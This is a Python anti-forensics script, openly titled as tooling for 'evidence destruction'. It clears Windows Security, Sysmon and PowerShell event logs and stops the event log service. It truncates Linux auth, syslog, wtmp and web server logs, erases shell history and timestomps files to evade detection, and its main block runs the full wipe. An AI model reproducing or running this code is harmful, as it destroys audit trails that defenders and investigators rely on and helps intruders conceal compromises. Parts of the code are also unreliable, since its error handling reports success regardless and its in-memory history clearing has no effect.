"""
Log Wiping and Evidence Destruction
Windows Event Log, Syslog, Application Logs
"""

import os
import subprocess
from typing import List

class WindowsEventLogWiper:
    """Clear Windows Event Logs"""
    
    LOGS = [
        "Application",
        "Security", 
        "System",
        "Setup",
        "Microsoft-Windows-Sysmon/Operational",
        "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-TaskScheduler/Operational",
        "Microsoft-Windows-WMI-Activity/Operational",
    ]
    
    def clear_all(self) -> List[str]:
        """Clear all Windows event logs"""
        cleared = []
        for log in self.LOGS:
            if self.clear_log(log):
                cleared.append(log)
        return cleared
    
    def clear_log(self, log_name: str) -> bool:
        """Clear specific event log"""
        try:
            cmd = f'wevtutil cl "{log_name}"'
            subprocess.run(cmd, shell=True, capture_output=True)
            return True
        except:
            return False
    
    def disable_logging(self) -> bool:
        """Disable Windows event logging service"""
        try:
            subprocess.run('net stop eventlog /y', shell=True, capture_output=True)
            return True
        except:
            return False


class LinuxLogWiper:
    """Clear Linux logs"""
    
    LOG_PATHS = [
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/secure",
        "/var/log/wtmp",
        "/var/log/btmp",
        "/var/log/lastlog",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
    ]
    
    def clear_all(self) -> List[str]:
        """Clear all common Linux logs"""
        cleared = []
        for log in self.LOG_PATHS:
            if self.clear_log(log):
                cleared.append(log)
        return cleared
    
    def clear_log(self, path: str) -> bool:
        """Truncate specific log file"""
        try:
            if os.path.exists(path):
                with open(path, 'w') as f:
                    f.truncate(0)
                return True
            return False
        except:
            return False
    
    def clear_bash_history(self) -> bool:
        """Clear bash history for current user"""
        try:
            home = os.path.expanduser("~")
            history_files = [
                f"{home}/.bash_history",
                f"{home}/.zsh_history",
                f"{home}/.history",
            ]
            for hf in history_files:
                if os.path.exists(hf):
                    with open(hf, 'w') as f:
                        f.truncate(0)
            # Also unset in-memory history
            os.system('history -c 2>/dev/null')
            return True
        except:
            return False


class TimestompManager:
    """Modify file timestamps to avoid detection"""
    
    def __init__(self):
        pass
    
    def stomp(self, filepath: str, reference_file: str = None) -> bool:
        """Copy timestamps from reference file or set to specific time"""
        try:
            if reference_file and os.path.exists(reference_file):
                stat = os.stat(reference_file)
                os.utime(filepath, (stat.st_atime, stat.st_mtime))
            else:
                # Set to Windows install date (looks legitimate)
                timestamp = 1609459200  # 2021-01-01 00:00:00
                os.utime(filepath, (timestamp, timestamp))
            return True
        except:
            return False


class LogWiper:
    """Main log wiping orchestrator"""
    
    def __init__(self):
        self.windows = WindowsEventLogWiper()
        self.linux = LinuxLogWiper()
        self.timestomp = TimestompManager()
    
    def wipe_all(self) -> dict:
        """Wipe all logs based on OS"""
        results = {"cleared": [], "errors": []}
        
        if os.name == 'nt':
            results["cleared"] = self.windows.clear_all()
        else:
            results["cleared"] = self.linux.clear_all()
            self.linux.clear_bash_history()
        
        return results


if __name__ == "__main__":
    wiper = LogWiper()
    results = wiper.wipe_all()
    print(f"Cleared: {results['cleared']}")
